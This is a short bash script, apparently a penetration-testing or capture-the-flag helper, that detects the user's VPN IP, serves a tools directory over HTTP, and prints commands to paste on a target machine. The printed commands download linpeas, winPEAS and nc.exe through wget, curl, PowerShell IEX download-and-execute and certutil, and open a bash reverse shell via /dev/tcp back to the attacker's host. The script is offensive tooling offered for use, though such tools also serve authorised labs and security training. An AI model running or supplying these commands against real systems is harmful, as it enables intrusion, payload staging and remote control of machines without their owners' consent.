#!/bin/bash
# transfer.sh — Serve files to target via HTTP with auto tun0 IP detection
# Usage: ./transfer.sh [port] [directory]
# Defaults: port 80, serves /opt/tools/ or current dir

PORT="${1:-80}"
SERVEDIR="${2:-.}"

# Auto-detect tun0 IP
TUN0=$(ip addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
if [ -z "$TUN0" ]; then
    echo "[!] tun0 not found — are you connected to VPN?"
    echo "[*] Falling back to eth0..."
    TUN0=$(ip addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+')
fi

if [ -z "$TUN0" ]; then
    echo "[!] No usable IP found."
    exit 1
fi

echo "╔══════════════════════════════════════╗"
echo "║         transfer.sh                  ║"
echo "╚══════════════════════════════════════╝"
echo "[+] Serving: $SERVEDIR"
echo "[+] Your IP: $TUN0:$PORT"
echo ""
echo "── Grab commands (paste on target) ──"
echo ""
echo "# wget"
echo "  wget http://$TUN0:$PORT/linpeas.sh"
echo ""
echo "# curl"
echo "  curl http://$TUN0:$PORT/linpeas.sh -o linpeas.sh"
echo ""
echo "# PowerShell"
echo "  IEX(New-Object Net.WebClient).DownloadString('http://$TUN0:$PORT/winPEAS.bat')"
echo "  Invoke-WebRequest -Uri http://$TUN0:$PORT/nc.exe -OutFile nc.exe"
echo ""
echo "# certutil (Windows)"
echo "  certutil -urlcache -split -f http://$TUN0:$PORT/nc.exe nc.exe"
echo ""
echo "# Bash reverse shell"
echo "  bash -i >& /dev/tcp/$TUN0/9001 0>&1"
echo ""
echo "── Starting server ──"
echo ""

cd "$SERVEDIR"
sudo python3 -m http.server "$PORT"
